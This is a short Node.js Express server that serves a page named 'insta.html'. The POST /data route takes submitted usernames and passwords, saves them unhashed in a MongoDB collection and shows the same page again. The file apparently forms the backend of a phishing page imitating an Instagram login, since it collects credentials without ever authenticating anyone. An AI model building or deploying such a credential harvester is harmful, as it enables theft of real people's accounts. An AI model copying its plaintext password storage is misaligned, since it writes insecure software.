const { urlencoded } = require("body-parser");
var express = require("express");
var app = express();
var mongoose = require("mongoose");
mongoose.connect("mongodb://localhost:27017/myFirstDatabase");
var mongodb = mongoose.connection;
var port = process.env.PORT || 7090;
app.use(express.urlencoded({extended:true}));
app.use(express.json());
app.get("/",function(req,res){
    res.sendFile(__dirname+"/insta.html");
});
app.post("/data",function(req,res){
    var username = req.body.username;
    var password = req.body.password;
    var obj = {
        username:username,
        password:password
    };
    mongodb.collection("data").insertOne(obj);
    res.sendFile(__dirname+"/insta.html")
});
app.listen(port,function(){
    console.log("server running at "+port);
});